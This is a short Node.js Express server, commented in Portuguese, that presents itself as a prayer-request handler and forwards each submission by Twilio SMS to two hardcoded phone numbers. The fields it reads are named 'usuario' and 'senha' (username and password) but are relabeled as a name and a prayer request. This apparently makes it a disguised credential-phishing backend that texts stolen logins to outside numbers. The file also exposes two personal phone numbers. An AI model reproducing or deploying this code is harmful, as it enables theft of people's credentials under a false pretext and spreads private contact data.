const express = require("express");
const bodyParser = require("body-parser");
const twilio = require("twilio");

const app = express();
const port = 3000;

// Configuração do body-parser
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Rota para receber os pedidos de oração do formulário
app.post("/enviar-oracao", (req, res) => {
  const nome = req.body.usuario;
  const pedidoOracao = req.body.senha;

  // Cria uma tabela para armazenar as informações do usuário
  const tabela = `
    Nome: ${nome}
    Pedido de Oração: ${pedidoOracao}
  `;

  // Envia a tabela como SMS usando a biblioteca Twilio
  enviarSmsParaAdministradores(tabela);

  res.send("Pedido de oração enviado com sucesso!");
});

// Função para enviar SMS para os administradores
function enviarSmsParaAdministradores(mensagem) {
  const accountSid = "YOUR_TWILIO_ACCOUNT_SID";
  const authToken = "YOUR_TWILIO_AUTH_TOKEN";
  const client = twilio(accountSid, authToken);

  const adminNumbers = ["+5515998435097", "+5515996837820"];

  for (const number of adminNumbers) {
    client.messages
      .create({
        body: mensagem,
        from: "YOUR_TWILIO_PHONE_NUMBER",
        to: number,
      })
      .then((message) => console.log("SMS enviado para", message.to))
      .catch((error) => console.error("Erro ao enviar SMS:", error));
  }
}

app.listen(port, () => {
  console.log(`Servidor rodando na porta ${port}`);
});
